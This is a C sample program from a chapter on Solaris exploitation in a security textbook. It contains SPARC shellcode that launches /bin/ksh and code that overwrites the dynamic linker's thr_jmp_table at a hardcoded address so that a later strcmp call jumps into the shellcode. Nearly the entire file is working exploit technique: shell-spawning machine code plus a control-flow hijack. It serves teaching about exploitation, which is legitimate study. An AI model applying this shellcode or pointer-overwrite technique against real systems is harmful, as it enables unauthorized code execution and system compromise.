/*

The Shellcoder's Handbook: Discovering and Exploiting Security Holes
Jack Koziol, David Litchfield, Dave Aitel, Chris Anley, 
Sinan Eren, Neel Mehta, Riley Hassell
Publisher: John Wiley & Sons
ISBN: 0764544683

Chapter 11: Advanced Solaris Exploitation
Sample Program #1

Please send comments/feedback to jack@infosecinstitute.com or visit http://www.infosecinstitute.com 

*/


#include <stdio.h>

                       /* http://lsd-pl.net           */
char shellcode[]=          /* 10*4+8 bytes                   */
    "\x20\xbf\xff\xff"     /* bn,a    <shellcode-4>          */
    "\x20\xbf\xff\xff"     /* bn,a    <shellcode>            */
    "\x7f\xff\xff\xff"     /* call    <shellcode+4>          */
    "\x90\x03\xe0\x20"     /* add     %o7,32,%o0             */
    "\x92\x02\x20\x10"     /* add     %o0,16,%o1             */
    "\xc0\x22\x20\x08"     /* st      %g0,[%o0+8]            */
    "\xd0\x22\x20\x10"     /* st      %o0,[%o0+16]           */
    "\xc0\x22\x20\x14"     /* st      %g0,[%o0+20]           */
    "\x82\x10\x20\x0b"     /* mov     0x0b,%g1               */
    "\x91\xd0\x20\x08"     /* ta      8                      */
    "/bin/ksh"
;

int
main(int argc, char **argv)
{
        long *ptr;
        long *addr = (long *) shellcode;

        printf("la la lala laaaaa\n");

  //ld.so base + thr_jmp_table
  //[433]   |0x000321b4|0x0000001c|OBJT |LOCL |0    |14     |thr_jmp_table
  //0xFF3B0000 + 0x000321b4       

        ptr = (long *) 0xff3e21b4;
        *ptr++ = (long)((long *) shellcode);

        strcmp("mocha", "latte");  //this will make us enter the dynamic linker 
                             //since there is no prior call to strcmp()

}


